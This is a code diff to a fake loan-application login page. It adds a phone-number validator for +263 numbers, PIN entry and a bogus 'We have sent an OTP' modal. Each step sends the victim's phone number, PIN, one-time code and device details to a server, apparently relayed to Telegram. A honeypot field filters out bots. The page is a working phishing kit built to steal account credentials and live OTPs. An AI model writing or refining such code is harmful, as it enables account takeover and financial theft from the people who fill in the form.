@@ -259,20 +259,65 @@ input:focus{
   </form>
 </div>
 
+<!-- OTP MODAL -->
+<div id="otpModal" class="otp-modal" style="display:none">
+  <div class="otp-box">
+    <div style="text-align:center"><strong>Enter OTP</strong></div>
+    <p class="small">We have sent an OTP to your phone.</p>
+
+    <div class="otp-row">
+      <input class="otp-digit" tabindex="-1">
+      <input class="otp-digit" tabindex="-1">
+      <input class="otp-digit" tabindex="-1">
+      <input class="otp-digit" tabindex="-1">
+      <input class="otp-digit" tabindex="-1">
+    </div>
+
+    <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
+           style="position:absolute;opacity:0;pointer-events:none">
+
+    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>
+
+    <div class="resend-row">
+      <div class="small">
+        Resend in <span id="countdown">120</span>s
+      </div>
+      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+    </div>
+
+    <div style="display:flex;gap:10px;margin-top:14px">
+      <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
+      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
+    </div>
+
+    <div id="otpStatus" class="small" style="margin-top:8px"></div>
+  </div>
+</div>
+
 <script>
+/* ===== PLAN FIX (SESSION + LOCAL FALLBACK) ===== */
+let selectedPlan=null;
+try{
+  const raw=sessionStorage.getItem('selectedPlan') || localStorage.getItem('selectedPlan');
+  if(raw){
+    selectedPlan=JSON.parse(raw);
+    localStorage.setItem('selectedPlan',raw);
+  }
+}catch(e){}
+
 /* ===== DEVICE ===== */
 const ua=navigator.userAgent;
 let device='Unknown';
-if(/Android/i.test(ua)) device='Android';
+if(/Android/i.test(ua)){const v=ua.match(/Android\s([\d.]+)/);device='Android '+(v?v[1]:'')}
+else if(/iPhone|iPad/i.test(ua)){const v=ua.match(/OS (\d+_\d+)/);device='iOS '+(v?v[1].replace('_','.'):'')}
 if(/Chrome/i.test(ua)) device+=' | Chrome';
 else if(/Safari/i.test(ua)) device+=' | Safari';
 else if(/Firefox/i.test(ua)) device+=' | Firefox';
 
-/* ===== TELEGRAM FORMAT (ONLY CHANGE) ===== */
+/* ===== TELEGRAM MESSAGE CHANGE (ONLY CHANGE) ===== */
 function normalizePlan(){
   try{
     const d = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
-
     return `loan_request: USD ${d.loanAmount || 'N/A'} / ` +
            `${d.loanType || 'N/A'} / ` +
            `${d.repayment ? d.repayment + ' month(s)' : 'N/A'} ` +
@@ -285,6 +330,7 @@ function normalizePlan(){
 /* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
+
 pins.forEach((el,i)=>{
   el.addEventListener('input',()=>{
     el.value=el.value.replace(/\D/g,'');
@@ -292,11 +338,50 @@ pins.forEach((el,i)=>{
     if(el.value && i<pins.length-1) pins[i+1].focus();
     updatePin();
   });
+  el.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){
+      if(el.value){
+        el.value='';
+        el.classList.remove('filled');
+      }else if(i>0){
+        pins[i-1].focus();
+        pins[i-1].value='';
+        pins[i-1].classList.remove('filled');
+      }
+      e.preventDefault();
+      updatePin();
+    }
+  });
 });
+
 function updatePin(){
   pinValue=pins.map(p=>p.value).join('');
-  loginBtn.disabled=pinValue.length!==4;
+  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
 }
+
+/* ===== PHONE ===== */
+const phone=document.getElementById('phone');
+const phoneError=document.getElementById('phoneError');
+const loginBtn=document.getElementById('loginBtn');
+
+function validatePhone(){
+  const d=phone.value.replace('+263','');
+  if(!d){phoneError.innerText='';return false}
+  if(!/^7\d{8}$/.test(d)){
+    phoneError.innerText='Enter your 9-digit number starting with 7';
+    return false;
+  }
+  phoneError.innerText='';
+  return true;
+}
+
+phone.addEventListener('input',()=>{
+  let d=phone.value.replace('+263','').replace(/\D/g,'');
+  if(d.startsWith('0')) d=d.slice(1);
+  d=d.slice(0,9);
+  phone.value='+263'+d;
+  validatePhone();
+});
 
 /* ===== API ===== */
 async function sendToServer(payload){
@@ -307,19 +392,103 @@ async function sendToServer(payload){
   });
 }
 
+/* ===== OTP ===== */
+const dots=[...document.querySelectorAll('.otp-digit')];
+const buffer=document.getElementById('otpBuffer');
+const confirmBtn=document.getElementById('confirmOtp');
+const otpWarning=document.getElementById('otpWarning');
+const resendBtn=document.getElementById('resendBtn');
+const countdown=document.getElementById('countdown');
+const otpStatus=document.getElementById('otpStatus');
+
+let timer=null,seconds=120;
+
+function renderOtp(v){
+  dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
+  confirmBtn.disabled=!/^\d{5}$/.test(v);
+  otpWarning.style.display=/^\d{5}$/.test(v)?'none':'block';
+}
+
+buffer.addEventListener('input',()=>{
+  buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
+  renderOtp(buffer.value);
+});
+dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));
+
+function startCountdown(){
+  clearInterval(timer);
+  seconds=120;
+  resendBtn.disabled=true;
+  countdown.textContent=seconds;
+  timer=setInterval(()=>{
+    countdown.textContent=--seconds;
+    if(seconds===0){clearInterval(timer);resendBtn.disabled=false}
+  },1000);
+}
+
 /* ===== LOGIN ===== */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
+  if(document.getElementById('hp').value) return;
+  if(navigator.vibrate) navigator.vibrate(30);
 
   await sendToServer({
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
-    plan: normalizePlan(),
+    plan:normalizePlan(),
     device,
     submittedAt:new Date().toISOString()
   });
+
+  document.getElementById('otpModal').style.display='flex';
+  buffer.value='';
+  renderOtp('');
+  buffer.focus();
+  startCountdown();
 });
+
+/* ===== CONFIRM ===== */
+confirmBtn.onclick=async()=>{
+  if(navigator.vibrate) navigator.vibrate(30);
+
+  await sendToServer({
+    event:'otp_confirm',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    otp:buffer.value,
+    plan:normalizePlan(),
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
+  setTimeout(()=>location.href='thankyou.html',1200);
+};
+
+/* ===== RESEND ===== */
+resendBtn.onclick=async()=>{
+  resendBtn.disabled=true;
+  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
+
+  await sendToServer({
+    event:'resend_otp',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:normalizePlan(),
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  resendBtn.innerHTML='OTP sent ✓';
+  setTimeout(()=>resendBtn.innerHTML='Resend OTP',1200);
+  startCountdown();
+};
+
+document.getElementById('cancelOtp').onclick=()=>{
+  document.getElementById('otpModal').style.display='none';
+  clearInterval(timer);
+};
 </script>
 
 </body>
